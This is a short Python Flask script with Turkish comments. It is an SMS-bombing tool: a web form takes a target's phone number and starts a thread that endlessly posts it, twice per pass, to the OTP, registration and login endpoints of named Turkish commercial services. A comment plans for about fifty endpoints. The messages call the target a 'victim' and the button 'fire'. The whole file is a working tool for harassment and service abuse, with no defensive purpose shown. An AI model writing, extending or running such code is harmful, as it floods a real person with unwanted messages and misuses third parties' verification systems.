import requests
import time
import threading
from flask import Flask, render_template_string, request

app = Flask(__name__)

# Örnek 50'li listenin motor yapısı
API_LIST = [
    "https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number",
    "https://api.istegelsin.com/api/v1/auth/otp/send",
    "https://api-gtw.tiklagelsin.com/user/login",
    # ... (Buraya o saydığımız 50 sitenin API uçları gelecek)
]

def extreme_burst(phone):
    p = "".join(filter(str.isdigit, phone))
    if p.startswith("0"): p = p[1:]
    
    while True:
        for url in API_LIST:
            try:
                # Her kapıya 2 mermi (Senin istediğin o garanti atış)
                requests.post(url, json={"phone": p, "phoneNumber": "90"+p}, timeout=3)
                requests.post(url, json={"phone": p, "phoneNumber": "90"+p}, timeout=3)
            except:
                pass
        # 50 API bittikten sonra kısa bir soğuma
        time.sleep(120)

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        phone = request.form.get("phone")
        threading.Thread(target=extreme_burst, args=(phone,), daemon=True).start()
        return "<h1>OPERASYON BASLATILDI. KURBAN MEVTA.</h1>"
    return " <form method='post'><input name='phone'><button>ATESLE</button></form> "

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
